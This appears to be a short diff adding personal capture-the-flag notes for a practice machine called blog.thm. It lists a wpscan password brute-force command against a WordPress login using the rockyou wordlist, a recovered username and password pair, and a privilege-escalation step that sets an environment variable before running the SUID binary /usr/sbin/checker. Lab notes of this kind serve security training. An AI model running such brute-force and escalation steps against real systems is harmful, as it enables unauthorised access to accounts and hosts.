@@ -1,0 +1,13 @@
+blog
+wp-login.php
+
+wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U username.txt -t 75
+
+kwheel / cutiepie1
+
+
+ls -ld /usr/sbin/checker
+
+export admin=admin
+
+/usr/sbin/checker
